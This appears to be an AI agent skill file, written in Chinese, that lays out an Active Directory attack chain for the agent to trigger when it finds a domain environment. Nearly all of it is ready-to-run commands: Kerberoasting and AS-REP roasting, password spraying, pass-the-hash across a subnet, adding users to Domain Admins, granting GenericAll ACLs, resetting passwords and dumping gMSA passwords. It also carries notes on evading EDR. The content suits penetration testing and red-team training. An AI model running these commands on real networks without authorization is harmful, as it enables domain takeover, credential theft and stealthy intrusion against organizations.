---
name: ad-domain-attack
description: "Active Directory 域环境攻击全链路。当目标主机在域环境中（systeminfo 显示 Domain 非 WORKGROUP）、发现 88/389/636 端口、或获取到域用户凭据时使用。覆盖域信息收集、用户枚举、Kerberoasting、AS-REP Roasting、委派攻击、ACL 滥用、DCSync、Golden/Silver Ticket"
metadata:
  tags: "ad,domain,kerberos,kerberoasting,asrep,delegation,dcsync,golden ticket,acl,域,域控,横向移动,ntlm,bloodhound,zerologon,CVE-2020-1472,netlogon"
  category: "lateral"
  mitre_attack: "T1558.003,T1558.004,T1003.006,T1550.002,T1550.003,T1098,T1484"
---

# AD 域攻击方法论

拿下域控 = 控制整个网络。

## ⛔ 深入参考（必读）

- 需要域侦察环境搭建与初始枚举 → [references/ad-recon-setup.md](references/ad-recon-setup.md)
- 需要认证后深度枚举方法 → [references/authenticated-enum.md](references/authenticated-enum.md)
- 需要密码喷洒、AS-REP Roasting、Kerberoasting 详细命令 → [references/credential-attacks.md](references/credential-attacks.md)
- 需要委派攻击(RBCD)、ACL 滥用、DCSync、持久化 → [references/domain-escalation.md](references/domain-escalation.md)
- → [references/zerologon-attack.md](references/zerologon-attack.md) — CVE-2020-1472 ZeroLogon 攻击与恢复

---

## Phase 1: 域环境确认与信息收集

### 1.1 确认域环境
```bash
systeminfo | findstr /i "domain"       # Windows
nltest /dclist:DOMAIN_NAME
nslookup -type=SRV _ldap._tcp.dc._msdcs.DOMAIN  # Linux
```
域控 IP 通常就是 DNS 服务器（`ipconfig /all` 中的 DNS Server）。

### 1.2 域枚举（无需凭据）
```bash
kerbrute userenum -d DOMAIN --dc DC_IP userlist.txt
netexec ldap DC_IP -u '' -p '' --users   # LDAP 匿名绑定
```

### 1.3 域深度枚举（需要域用户凭据）
```bash
netexec ldap DC_IP -u USER -p PASS --users
net accounts /domain    # 密码策略（锁定阈值！）
impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP   # SPN 枚举
bloodhound-python -d DOMAIN -u USER -p PASS -dc DC_IP -c all
```
BloodHound 能自动发现攻击路径，是域渗透最强大的工具。

## Phase 2: 攻击决策树

```
拥有的凭据？
├─ 无凭据 → AS-REP Roasting（无需预认证的用户）→ [references/credential-attacks.md](references/credential-attacks.md)
├─ 任意域用户 → Kerberoasting（SPN 服务账户）→ [references/credential-attacks.md](references/credential-attacks.md)
│             → 密码喷洒（先查锁定策略！）→ [references/credential-attacks.md](references/credential-attacks.md)
│             → BloodHound 找攻击路径
├─ 本地管理员 → SAM dump → PTH 横向 → 凭据复用
├─ 域管权限 → DCSync 提取所有哈希 → [references/domain-escalation.md](references/domain-escalation.md)
└─ 发现委派/ACL 路径 → 委派攻击/ACL 滥用 → [references/domain-escalation.md](references/domain-escalation.md)
```

### 凭据复用速查
```bash
netexec smb 10.0.0.0/24 -u USER -p PASS --continue-on-success
netexec smb 10.0.0.0/24 -u admin -H NTLM_HASH   # PTH
```

## 工具速查
| 场景 | 推荐工具 |
|------|----------|
| 域枚举 | BloodHound, netexec |
| 票据攻击 | impacket 套件 |
| 密码破解 | hashcat |
| 漏洞利用 | certipy (ADCS), zerologon 脚本 |
| NTLM 中继 | ntlmrelayx + Responder |
| 证书攻击 | certipy (ESC1-ESC11) |
## Password Spray 安全策略
- 检查域密码策略：Lockout duration（锁定时长/冷却时间）
- 避免账户锁定影响可用性
- observation window（观察窗口）：了解计数器重置时间

## 工具替代与规避
- SharpHound 可能被拦截（杀软/EDR），需要替代方案
- LDAP 查询可远程执行：无需上传工具、不接触目标文件系统

## 补充工具

### bloodyAD — AD LDAP 操作
```bash
# 添加用户到组
bloodyAD -d DOMAIN -u USER -p PASS --host DC_IP add groupMember "Domain Admins" "TARGET_USER"
# 修改 ACL（添加 GenericAll）
bloodyAD -d DOMAIN -u USER -p PASS --host DC_IP add genericAll "OU=xxx,DC=dom,DC=local" TARGET_USER
# 查询可写对象
bloodyAD -d DOMAIN -u USER -p PASS --host DC_IP get writable
# 修改密码
bloodyAD -d DOMAIN -u USER -p PASS --host DC_IP set password TARGET_USER "NewP@ss123"
```

### ldeep — LDAP 深度枚举
```bash
# 连接并枚举
ldeep ldap -d DOMAIN -u USER -p PASS -s ldap://DC_IP all
# 枚举委派配置
ldeep ldap -d DOMAIN -u USER -p PASS -s ldap://DC_IP delegations
# 枚举 SPN
ldeep ldap -d DOMAIN -u USER -p PASS -s ldap://DC_IP spns
# 枚举 ASREPRoast 用户
ldeep ldap -d DOMAIN -u USER -p PASS -s ldap://DC_IP asreproast
# 枚举信任关系
ldeep ldap -d DOMAIN -u USER -p PASS -s ldap://DC_IP trusts
```

### enum4linux-ng — SMB/RPC 枚举
```bash
# 完整枚举（用户、组、共享、策略、RID）
enum4linux-ng -A TARGET_IP
# 认证枚举
enum4linux-ng -A TARGET_IP -u USER -p PASS
# 仅用户枚举
enum4linux-ng -U TARGET_IP -u USER -p PASS
```

### gMSADumper — gMSA 密码提取
```bash
# 导出 gMSA 账户密码
python3 /pentest/gMSADumper/gMSADumper.py -d DOMAIN -u USER -p PASS -l DC_IP
```
